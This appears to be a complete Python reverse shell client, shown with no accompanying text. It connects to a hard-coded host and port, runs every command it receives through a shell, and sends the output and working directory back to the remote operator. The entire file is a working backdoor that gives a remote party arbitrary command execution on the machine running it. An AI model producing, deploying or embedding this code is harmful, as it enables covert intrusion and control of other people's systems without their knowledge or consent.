import socket
import os
import subprocess


sock = socket.socket()
host = "192.168.10.14"
port = 65535
sock.connect((host,port))

while True:
	data = sock.recv(1024)
	if(data[0:2].decode('utf-8') == "cd"):
		os.chdir(data[3:].decode("utf-8"))

	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
		output_byte = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_byte,"utf-8")
		pwd = os.getcwd() + "> "
		sock.send(str.encode(output_str + pwd))
		
		print(output_str)
		
